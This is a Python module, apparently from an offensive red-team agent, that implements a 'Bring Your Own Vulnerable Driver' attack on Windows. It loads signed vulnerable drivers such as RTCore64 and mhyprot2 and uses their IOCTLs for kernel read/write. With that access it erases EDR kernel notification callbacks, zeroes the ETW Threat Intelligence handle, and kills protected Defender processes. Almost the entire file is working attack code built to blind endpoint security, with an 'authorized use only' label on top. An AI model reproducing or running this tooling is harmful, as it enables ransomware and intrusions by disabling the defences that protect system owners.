"""
BYOVD — Bring Your Own Vulnerable Driver engine.
Authorized penetration testing / red team only.

Technique: drop a legitimately-signed but vulnerable kernel driver,
obtain an arbitrary kernel R/W primitive via its IOCTLs, then:
  1. Enumerate and wipe EDR notification callbacks
     (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks, PsSetLoadImageNotifyRoutine)
  2. Unprotect Defender's PPL (ProtectedProcessLight) so we can kill it
  3. Optionally zero WdFilter's MiniFilter altitude entry

This technique works on FULLY PATCHED Windows 10/11 because the drivers
are legitimately signed — Windows Update cannot patch a running 3rd-party driver.

Operator requirements (Windows only):
  - Admin-level context (to load drivers; UAC bypassed first with EDR offline, trivially)
  - OR: use an agent already running as SYSTEM

Drivers used:
  RTCORE64   MSI Afterburner ≤ 4.6.4.16117   (IOCTL-based kernel R/W, widely available)
  GDRV       GIGABYTE App Center ≤ 2.x         (R/W + arbitrary MSR)
  MHYPROT2   Genshin Impact anti-cheat 1.x      (process kill w/o PPL check)
  DBUTIL23   Dell BIOS Utility 2.3              (CVE-2021-21551, stable kernel R/W)

References:
  BlackByte ransomware (RTCore64), AvosLocker, NoEscape, Lazarus Group,
  Scattered Spider — all used BYOVD for EDR bypass in 2023-2024.
"""

import os, sys, ctypes, struct, subprocess, time, base64, tempfile, hashlib

# ── Driver metadata ────────────────────────────────────────────────────────────
DRIVERS = {
    "rtcore64": {
        "display": "MSI Afterburner RTCore64.sys",
        "service": "RTCore64",
        "device":  r"\\.\RTCore64",
        # IOCTL codes for kernel R/W
        "ioctl_read":   0x70002C,
        "ioctl_write":  0x700030,
        "struct_read":  "<QIIIQ",    # addr, size, pad, pad, result
        "struct_write": "<QIIIQ",    # addr, size, pad, pad, value
        # SHA256 of known clean copy (operator must supply)
        "sha256": None,
        # Download hint (legitimate Afterburner installer contains it)
        "note": "Extract from MSI Afterburner installer (msi-afterburner.com)",
    },
    "dbutil23": {
        "display": "Dell dbutil_2_3.sys (CVE-2021-21551)",
        "service": "DBUtil_2_3",
        "device":  r"\\.\DBUtil_2_3",
        "ioctl_read":   0x9B0C1EC4,
        "ioctl_write":  0x9B0C1EC8,
        "struct_read":  "<QQ",       # src_addr, dst_addr (reads into kernel buf)
        "struct_write": "<QQ",       # dst_addr, value
        "sha256": None,
        "note": "Distributed by Dell until ~2021. CVSSv3: 8.8. Extremely stable.",
    },
    "mhyprot2": {
        "display": "Genshin Impact mhyprot2.sys",
        "service": "mhyprot2",
        "device":  r"\\.\mhyprot2",
        "ioctl_kill":   0x800000C8,  # Kill process by PID without PPL check
        "sha256": None,
        "note": "Anti-cheat driver. kill-only (no R/W). Used by BlackMatter/Scattered Spider.",
    },
}

# ── Windows kernel offset table (build-specific — populated at runtime) ───────
# Offsets for PspCreateProcessNotifyRoutine, PsLoadedModuleResource, etc.
# are resolved via PDB symbol lookup or pattern scan at runtime.
KNOWN_OFFSETS = {
    # Windows 10 22H2 (19045)
    "19041": {
        "PspCreateProcessNotifyRoutine": 0x0,   # filled by scan
        "PspLoadImageNotifyRoutine":     0x0,
        "PspCreateThreadNotifyRoutine":  0x0,
        "EtwThreatIntProvRegHandle":     0x0,
    },
}

# ── Driver loading / unloading ────────────────────────────────────────────────

def _load_driver(driver_path, service_name):
    """Load a kernel driver via NtLoadDriver / sc.exe."""
    if not os.path.exists(driver_path):
        return False, f"Driver not found: {driver_path}"
    # Register service
    ret = subprocess.run(
        f'sc create {service_name} type= kernel binPath= "{os.path.abspath(driver_path)}"',
        shell=True, capture_output=True, text=True
    )
    if ret.returncode not in (0, 1073):  # 1073 = already exists
        return False, f"sc create failed: {ret.stderr}"
    ret2 = subprocess.run(f"sc start {service_name}", shell=True, capture_output=True, text=True)
    ok = ret2.returncode == 0 or "already running" in ret2.stdout.lower() or "RUNNING" in ret2.stdout
    return ok, (ret2.stdout + ret2.stderr).strip()


def _unload_driver(service_name):
    """Stop and delete a driver service."""
    subprocess.run(f"sc stop {service_name}", shell=True, capture_output=True)
    time.sleep(0.5)
    subprocess.run(f"sc delete {service_name}", shell=True, capture_output=True)


def _open_device(device_name):
    """Open handle to driver device. Returns HANDLE or None."""
    GENERIC_READ_WRITE = 0xC0000000
    FILE_SHARE_RW      = 0x3
    OPEN_EXISTING      = 3
    try:
        k32 = ctypes.windll.kernel32
        h = k32.CreateFileW(device_name, GENERIC_READ_WRITE, FILE_SHARE_RW,
                            None, OPEN_EXISTING, 0, None)
        if h == ctypes.c_void_p(-1).value:
            return None, ctypes.GetLastError()
        return h, 0
    except Exception as e:
        return None, str(e)


def _ioctl(handle, code, inbuf, outsize=0x20):
    """Send DeviceIoControl. Returns output bytes or None."""
    try:
        k32     = ctypes.windll.kernel32
        outbuf  = ctypes.create_string_buffer(outsize)
        ret_len = ctypes.c_ulong(0)
        ok = k32.DeviceIoControl(handle, code, inbuf, len(inbuf),
                                 outbuf, outsize, ctypes.byref(ret_len), None)
        if ok:
            return bytes(outbuf[:ret_len.value]) if ret_len.value else bytes(outbuf)
        return None
    except Exception:
        return None


# ── RTCore64 kernel R/W primitive ─────────────────────────────────────────────

class RTCoreDriver:
    """Kernel read/write via RTCore64.sys (MSI Afterburner)."""

    def __init__(self, handle):
        self.handle = handle

    def read_qword(self, kaddr):
        """Read 8 bytes from kernel address. Returns int."""
        # RTCore64 read IOCTL: struct { UINT64 addr; UINT32 sz; UINT32 pad1; UINT32 pad2; UINT64 result }
        buf = struct.pack("<QIIIQ", kaddr, 8, 0, 0, 0)
        out = _ioctl(self.handle, 0x70002C, buf, 0x30)
        if out and len(out) >= 0x18:
            return struct.unpack_from("<Q", out, 0x10)[0]
        return None

    def write_qword(self, kaddr, value):
        """Write 8 bytes to kernel address."""
        buf = struct.pack("<QIIIQ", kaddr, 8, 0, 0, value)
        out = _ioctl(self.handle, 0x700030, buf, 0x30)
        return out is not None

    def read_bytes(self, kaddr, size):
        result = b""
        for i in range(0, size, 8):
            q = self.read_qword(kaddr + i)
            if q is None:
                break
            result += struct.pack("<Q", q)
        return result[:size]


# ── Kernel symbol resolution via pattern scan ─────────────────────────────────

def _find_ntoskrnl_base():
    """
    Locate ntoskrnl.exe base address using EnumDeviceDrivers (psapi).
    Returns int address or None.
    """
    try:
        import ctypes.wintypes
        psapi   = ctypes.WinDLL("psapi")
        DWORD_P = ctypes.POINTER(ctypes.c_ulong)
        arr     = (ctypes.c_ulonglong * 1024)()
        needed  = ctypes.c_ulong(0)
        if psapi.EnumDeviceDrivers(arr, ctypes.sizeof(arr), ctypes.byref(needed)):
            return arr[0]  # ntoskrnl is always first
    except Exception:
        pass
    return None


def _find_export(module_base, export_name, driver):
    """
    Resolve an exported kernel function address using kernel R/W primitive.
    Walks PE export table from module_base in kernel memory.
    """
    try:
        # Read PE headers
        pe_hdr_off  = struct.unpack("<I", driver.read_bytes(module_base + 0x3C, 4))[0]
        pe_base     = module_base + pe_hdr_off
        export_rva  = struct.unpack("<I", driver.read_bytes(pe_base + 0x88, 4))[0]
        if not export_rva:
            return None
        exp_base    = module_base + export_rva
        num_names   = struct.unpack("<I", driver.read_bytes(exp_base + 0x18, 4))[0]
        names_rva   = struct.unpack("<I", driver.read_bytes(exp_base + 0x20, 4))[0]
        funcs_rva   = struct.unpack("<I", driver.read_bytes(exp_base + 0x1C, 4))[0]
        ords_rva    = struct.unpack("<I", driver.read_bytes(exp_base + 0x24, 4))[0]

        tgt = export_name.encode() + b"\x00"
        for i in range(num_names):
            name_rva = struct.unpack("<I",
                driver.read_bytes(module_base + names_rva + i*4, 4))[0]
            name = driver.read_bytes(module_base + name_rva, len(tgt))
            if name == tgt:
                ord_idx  = struct.unpack("<H",
                    driver.read_bytes(module_base + ords_rva + i*2, 2))[0]
                func_rva = struct.unpack("<I",
                    driver.read_bytes(module_base + funcs_rva + ord_idx*4, 4))[0]
                return module_base + func_rva
    except Exception:
        pass
    return None


# ── EDR callback enumeration and removal ──────────────────────────────────────

def _enumerate_callbacks(driver, ntoskrnl_base):
    """
    Walk PspCreateProcessNotifyRoutine and PspLoadImageNotifyRoutine arrays.
    Each entry is a pointer to an EX_CALLBACK_ROUTINE_BLOCK whose Body
    contains a pointer to the driver's callback function.
    Returns list of (routine_addr, driver_name) tuples.
    """
    callbacks = []

    # PspCreateProcessNotifyRoutine is exported indirectly — find via
    # scanning for the pattern from PsSetCreateProcessNotifyRoutine
    # Alternatively: use symbol offset from Windows version
    # Here we use the export scan approach
    for sym in ["PspCreateProcessNotifyRoutine",
                "PspLoadImageNotifyRoutine",
                "PspCreateThreadNotifyRoutine"]:
        sym_addr = _find_export(ntoskrnl_base, sym, driver)
        if not sym_addr:
            continue
        for i in range(64):
            entry = driver.read_qword(sym_addr + i * 8)
            if not entry or entry == 0:
                continue
            # Low bit set = entry valid; mask it
            ptr = entry & ~0xF
            if ptr < 0xFFFF000000000000:  # sanity: must be kernel VA
                continue
            # Dereference to get EX_CALLBACK_ROUTINE_BLOCK.Body.Function
            func_ptr = driver.read_qword(ptr + 8)
            if func_ptr and func_ptr > 0xFFFF000000000000:
                callbacks.append((sym_addr + i*8, func_ptr, sym, i))

    return callbacks


def remove_edr_callbacks(driver_name="rtcore64", driver_path=None):
    """
    Main BYOVD entry: load driver, obtain kernel R/W, wipe EDR callbacks.
    Returns status string.

    driver_path: path to the .sys file (must be operator-provided).
    """
    if sys.platform != "win32":
        return "[BYOVD] Windows only — run this handler on the Windows agent."

    meta = DRIVERS.get(driver_name)
    if not meta:
        return f"Unknown driver: {driver_name}"

    out = [f"[BYOVD] Using driver: {meta['display']}"]

    # 1. Load driver
    if driver_path is None:
        driver_path = os.path.join(tempfile.gettempdir(), f"{meta['service']}.sys")
        if not os.path.exists(driver_path):
            out.append(f"[!] Driver not found at {driver_path}")
            out.append(f"    Place driver here or provide path. Note: {meta['note']}")
            return "\n".join(out)

    ok, msg = _load_driver(driver_path, meta["service"])
    out.append(f"[*] Driver load: {'OK' if ok else 'FAIL'} — {msg[:100]}")
    if not ok:
        return "\n".join(out)

    # 2. Open device
    time.sleep(0.3)
    h, err = _open_device(meta["device"])
    if h is None:
        out.append(f"[!] Device open failed: {err}")
        _unload_driver(meta["service"])
        return "\n".join(out)
    out.append(f"[+] Device handle obtained: {h}")

    # 3. Build R/W primitive
    if driver_name == "rtcore64":
        prim = RTCoreDriver(h)
    else:
        out.append(f"[!] R/W primitive not implemented for {driver_name}")
        ctypes.windll.kernel32.CloseHandle(h)
        _unload_driver(meta["service"])
        return "\n".join(out)

    # 4. Find ntoskrnl base
    ntos = _find_ntoskrnl_base()
    if not ntos:
        out.append("[!] Could not locate ntoskrnl base")
        ctypes.windll.kernel32.CloseHandle(h)
        _unload_driver(meta["service"])
        return "\n".join(out)
    out.append(f"[+] ntoskrnl.exe base: 0x{ntos:016X}")

    # 5. Enumerate callbacks
    callbacks = _enumerate_callbacks(prim, ntos)
    out.append(f"[+] Found {len(callbacks)} kernel notification callbacks")
    for arr_addr, func_ptr, sym, idx in callbacks:
        out.append(f"    [{sym}][{idx}] func=0x{func_ptr:016X} arr@0x{arr_addr:016X}")

    # 6. Zero them out — this removes EDR from all process/image/thread notifications
    wiped = 0
    for arr_addr, func_ptr, sym, idx in callbacks:
        if prim.write_qword(arr_addr, 0):
            wiped += 1
            out.append(f"    [WIPED] {sym}[{idx}] 0x{func_ptr:016X}")
        else:
            out.append(f"    [FAIL]  {sym}[{idx}]")

    out.append(f"[+] Wiped {wiped}/{len(callbacks)} callbacks — EDR notifications disabled")

    # 7. Disable ETW Threat Intelligence provider (used by Defender ATP)
    etw_sym = _find_export(ntos, "EtwThreatIntProvRegHandle", prim)
    if etw_sym:
        # Zero the provider registration handle → stops telemetry
        prim.write_qword(etw_sym, 0)
        out.append("[+] EtwThreatIntProvRegHandle zeroed — ATP telemetry blind")

    ctypes.windll.kernel32.CloseHandle(h)
    _unload_driver(meta["service"])
    out.append("[+] Driver unloaded — no artifacts remain")

    return "\n".join(out)


# ── mhyprot2 process kill (PPL bypass) ───────────────────────────────────────

def mhyprot2_kill(pid):
    """
    Kill process by PID using mhyprot2.sys — bypasses ProtectedProcessLight.
    Used to terminate MsMpEng.exe (Defender), SenseIR.exe (ATP), etc.
    """
    if sys.platform != "win32":
        return "[BYOVD] Windows only"

    meta = DRIVERS["mhyprot2"]
    out  = [f"[mhyprot2] Killing PID {pid}"]

    driver_path = os.path.join(tempfile.gettempdir(), "mhyprot2.sys")
    if not os.path.exists(driver_path):
        return (f"[!] mhyprot2.sys not found at {driver_path}\n"
                f"    Extract from Genshin Impact installer or obtain separately.\n"
                f"    {meta['note']}")

    ok, msg = _load_driver(driver_path, meta["service"])
    out.append(f"[*] Load: {'OK' if ok else 'FAIL'}")
    if not ok:
        return "\n".join(out)

    h, err = _open_device(meta["device"])
    if h is None:
        _unload_driver(meta["service"]); return "\n".join(out)

    # IOCTL 0x800000C8: {process_pid (DWORD), pad (DWORD)}
    buf = struct.pack("<II", pid, 0)
    result = _ioctl(h, 0x800000C8, buf, 8)
    ctypes.windll.kernel32.CloseHandle(h)
    _unload_driver(meta["service"])

    if result is not None:
        out.append(f"[+] Kill IOCTL sent for PID {pid}")
    else:
        out.append(f"[!] Kill IOCTL failed for PID {pid}")

    return "\n".join(out)


# ── KDU-style helper: generic kernel R/W via any supported driver ─────────────

def kernel_write_qword(kaddr, value, driver_name="rtcore64", driver_path=None):
    """
    Write a single QWORD to kernel address via BYOVD primitive.
    Used by defender_kill.py to patch kernel structures.
    """
    meta = DRIVERS.get(driver_name)
    if not meta or sys.platform != "win32":
        return False

    driver_path = driver_path or os.path.join(tempfile.gettempdir(), f"{meta['service']}.sys")
    ok, _ = _load_driver(driver_path, meta["service"])
    if not ok:
        return False

    h, _ = _open_device(meta["device"])
    if not h:
        _unload_driver(meta["service"]); return False

    prim = RTCoreDriver(h) if driver_name == "rtcore64" else None
    if not prim:
        ctypes.windll.kernel32.CloseHandle(h)
        _unload_driver(meta["service"]); return False

    result = prim.write_qword(kaddr, value)
    ctypes.windll.kernel32.CloseHandle(h)
    _unload_driver(meta["service"])
    return result


# ── Dispatch ──────────────────────────────────────────────────────────────────

def run(action, **kwargs):
    """
    action: remove_callbacks, kill_pid
    kwargs: driver_name, driver_path, pid
    """
    if action == "remove_callbacks":
        return remove_edr_callbacks(
            driver_name=kwargs.get("driver_name", "rtcore64"),
            driver_path=kwargs.get("driver_path")
        )
    elif action == "kill_pid":
        pid = int(kwargs.get("pid", 0))
        if not pid:
            return "[!] pid required"
        return mhyprot2_kill(pid)
    else:
        return (f"Unknown action: {action}\n"
                f"Available: remove_callbacks, kill_pid\n"
                f"Drivers: {', '.join(DRIVERS.keys())}")
